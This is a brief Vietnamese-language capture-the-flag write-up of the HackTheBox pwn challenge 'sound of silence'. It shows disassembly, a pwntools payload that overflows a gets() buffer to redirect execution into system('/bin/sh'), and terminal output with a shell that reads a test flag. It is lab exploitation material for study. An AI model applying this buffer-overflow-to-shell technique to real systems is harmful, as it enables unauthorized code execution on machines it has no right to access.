# write up sound of silence 
- với bài này em thấy rằng trong chương trình có đoạn code này

```assembly
  0x0000000000401169 <+19>:	mov    rdi,rax
   0x000000000040116c <+22>:	call   0x401050 <system@plt>
   0x0000000000401171 <+27>:	lea    rax,[rbp-0x20]
   0x0000000000401175 <+31>:	mov    rdi,rax
   0x0000000000401178 <+34>:	mov    eax,0x0
   0x000000000040117d <+39>:	call   0x401060 <gets@plt>
   0x0000000000401182 <+44>:	nop
   0x0000000000401183 <+45>:	leave
   0x0000000000401184 <+46>:	ret
```
- cộng với việc sau khi rời khỏi gets bị buffer overflow trong chương trình và đến return thì kết quả nhập vào được lưu trong 1 chiếc địa chỉ của stack và đẩy lên rax thì em có thể bỏ đoạn code này ở saved rip để sau khi nó return thì nó chạy đoạn code này với tham số truyền vào cho hàm system là rdi là chuỗi "/bin/sh\0"
```python
    payload = b'a'*8
    payload += b'a'*8
    payload += b'a'*8
    payload += b'a'*8
    payload += b'/bin/sh\0'
payload += p64(go_system)
p.sendlineafter(b'>>',payload)
```
- đáng nhẽ ra rax sẽ chứa chuỗi đầu em nhập vào nhưng mà em nhận ra hành vi kì lạ của chương trình nên em sẽ để chuỗi /bin/sh\0 ở 1 chỗ khác mà nó chạy được

```bash

[*] '/home/as/pwnable/report/hacktheboxx/pwn_sound_of_silence/challenge/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/as/pwnable/report/hacktheboxx/pwn_sound_of_silence/challenge/ld-linux-x86-64.so.2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/as/pwnable/report/hacktheboxx/pwn_sound_of_silence/challenge/sound_of_silence_patched': pid 135511
[*] running in new terminal: ['/usr/bin/gdb', '-q', '/home/as/pwnable/report/hacktheboxx/pwn_sound_of_silence/challenge/sound_of_silence_patched', '135511', '-x', '/tmp/pwnkeobju9j.gdb']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
 $ ls
flag.txt  ld-linux-x86-64.so.2    sound_of_silence      sound_of_silence.py
glibc      libc.so.6        sound_of_silence.i64  sound_of_silence_patched
$ cat flag
cat: flag: No such file or directory
$ cat flag.txt
HTB{f4k3_fl4g_4_t35t1ng}
$
```
